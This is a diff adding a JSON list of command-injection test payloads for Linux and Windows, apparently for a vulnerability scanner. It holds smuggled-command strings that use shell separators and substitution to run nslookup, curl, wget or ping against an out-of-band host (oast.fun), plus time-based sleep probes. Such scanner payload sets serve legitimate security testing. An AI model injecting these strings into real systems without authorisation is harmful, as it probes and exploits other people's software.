@@ -1,0 +1,25 @@
+{
+  "vulnerability": "Command Injection",
+  "category": "cmdi",
+  "dialects": {
+    "linux": [
+      {"name": "Semicolon nslookup", "type": "oast", "payload": "; nslookup {oast_id}.oast.fun #", "oast": true},
+      {"name": "Pipe nslookup", "type": "oast", "payload": "| nslookup {oast_id}.oast.fun", "oast": true},
+      {"name": "Backtick nslookup", "type": "oast", "payload": "`nslookup {oast_id}.oast.fun`", "oast": true},
+      {"name": "Dollar nslookup", "type": "oast", "payload": "$(nslookup {oast_id}.oast.fun)", "oast": true},
+      {"name": "Semicolon curl OAST", "type": "oast", "payload": "; curl http://{oast_id}.oast.fun/cmd #", "oast": true},
+      {"name": "Semicolon wget OAST", "type": "oast", "payload": "; wget http://{oast_id}.oast.fun/cmd #", "oast": true},
+      {"name": "Blind Timing Sleep", "type": "time_based", "payload": "; sleep {delay} #", "delay": 5, "oast": false},
+      {"name": "Blind Timing Ping", "type": "time_based", "payload": "| timeout 5 ping -c 5 127.0.0.1", "delay": 5, "oast": false},
+      {"name": "Newline Injection", "type": "oast", "payload": "\nnslookup {oast_id}.oast.fun\n", "oast": true},
+      {"name": "AND Operator", "type": "oast", "payload": "&& nslookup {oast_id}.oast.fun", "oast": true},
+      {"name": "OR Operator", "type": "oast", "payload": "|| nslookup {oast_id}.oast.fun", "oast": true}
+    ],
+    "windows": [
+      {"name": "nslookup OAST", "type": "oast", "payload": "& nslookup {oast_id}.oast.fun", "oast": true},
+      {"name": "ping OAST", "type": "oast", "payload": "& ping -n 1 {oast_id}.oast.fun", "oast": true},
+      {"name": "curl OAST", "type": "oast", "payload": "& curl http://{oast_id}.oast.fun/cmd", "oast": true},
+      {"name": "Blind Timing", "type": "time_based", "payload": "& timeout /t {delay}", "delay": 5, "oast": false}
+    ]
+  }
+}
